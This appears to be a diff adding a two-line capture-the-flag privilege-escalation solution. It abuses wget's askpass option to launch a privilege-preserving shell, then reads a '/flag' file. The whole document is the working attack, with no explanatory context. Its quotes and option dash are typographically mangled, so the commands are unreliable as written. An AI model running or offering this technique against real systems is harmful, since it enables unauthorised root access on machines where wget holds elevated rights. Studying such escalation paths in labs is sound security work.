@@ -1,0 +1,2 @@
+F=$(mktemp) && chmod +x $F && echo -e ‘#!/bin/sh -p\n/bin/sh -p 1>&0’ >$F && wget — use-askpass=$F 0
+cat /flag
